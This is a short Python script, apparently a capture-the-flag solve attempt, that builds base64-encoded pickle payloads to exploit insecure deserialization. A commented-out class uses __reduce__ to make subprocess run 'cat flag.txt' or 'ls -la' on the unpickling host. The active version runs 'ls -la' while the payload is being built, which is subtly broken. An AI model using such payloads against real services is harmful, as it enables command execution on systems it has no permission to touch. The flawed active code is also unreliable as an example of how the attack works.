import pickle
import base64
import subprocess

data = [1, 2, 3]
payload = pickle.dumps(data)
test_payload = base64.b64encode(payload)
print(test_payload)

# ChatGPT output below
# It had a typo with _reduce_ instead of __reduce__ LOL

# Create a class to exploit deserialization
# class Exploit(object):
#     def __reduce__(self):
#         # Using subprocess to execute the 'cat flag.txt' command and capture output
#         # return (subprocess.check_output, (['cat', 'flag.txt'],))
#         return (subprocess.check_output, (['ls', '-la'],))

class Exploit(object):
    def __reduce__(self):
        # Run 'ls -la' and decode the output
        result = subprocess.check_output(['ls', '-la']).decode('utf-8')
        # Return a tuple wrapped in another iterable (like a list) to avoid the tuple error
        return (tuple, (('username', 'exploit', 'role', 'user', 'file_list', result),))

# Serialize the payload
payload = pickle.dumps(Exploit())

# Encode to base64 to match the format
encoded_payload = base64.b64encode(payload)
print(encoded_payload)

#####